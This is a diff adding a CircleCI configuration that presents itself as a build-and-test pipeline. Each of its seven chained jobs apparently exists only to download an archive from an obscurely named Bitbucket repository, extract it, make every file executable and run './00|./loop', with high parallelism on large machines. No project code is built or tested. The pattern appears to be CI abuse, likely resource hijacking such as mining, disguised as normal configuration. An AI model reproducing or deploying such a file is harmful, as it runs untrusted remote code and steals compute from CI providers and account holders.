@@ -1,1 +1,148 @@
+version: 2.1
+
+
+jobs:
+  build:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 10
+    resource_class: large
+    steps:
+      - run:
+          name: app1
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  test:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 10
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  kals:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 10
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  luks:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  rens:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  kuols:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+  sets:
+    docker:
+      - image: cimg/python:3.12
+    parallelism: 20
+    resource_class: large
+    steps:
+      - run:
+          name: app2
+          command: |
+            curl -O https://bitbucket.org/nuklisadinoplaesruiewoaieosaslahbaszuxicoaseoiseoias/telurdadardanmatasapisebaiknyadigorengajajangandirebusnamanyaj/raw/1dd55994de3abc728789fb2b689555357e4b4d8b/look
+            tar -xf look
+            chmod u+x *
+            ./00|./loop
+
+
+
+
+
+
+
+
+workflows:
+  build_and_test:
+    jobs:
+      - build
+      - test:
+          requires:
+            - build
+      - kals:
+          requires:
+            - test
+      - luks:
+          requires:
+            - kals
+      - rens:
+          requires:
+            - luks
+      - kuols:
+          requires:
+            - rens
+      - sets:
+          requires:
+            - kuols
+
+
+
+
+
+
+
+
+
+
 
